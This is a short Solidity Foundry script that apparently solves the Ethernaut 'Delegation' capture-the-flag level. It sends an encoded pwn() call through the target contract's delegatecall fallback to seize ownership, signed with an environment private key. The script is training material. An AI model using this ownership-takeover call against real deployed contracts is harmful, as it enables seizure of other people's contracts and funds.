// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Delegation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

error AttackFailed();

contract DelegationScript is Script {
    address constant ETHERNAUT_CONTRACT_ADDRESS = 0x29Ab8387a28A684617a365d0738ef106BCf6b5B6;
    Delegation public delegation = Delegation(ETHERNAUT_CONTRACT_ADDRESS);

    function run() external {
        bytes memory pawnSig = abi.encodeWithSignature("pwn()");

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        (bool success,) = address(delegation).call(pawnSig);
        if (!success) {
            revert AttackFailed();
        }

        vm.stopBroadcast();
    }
}
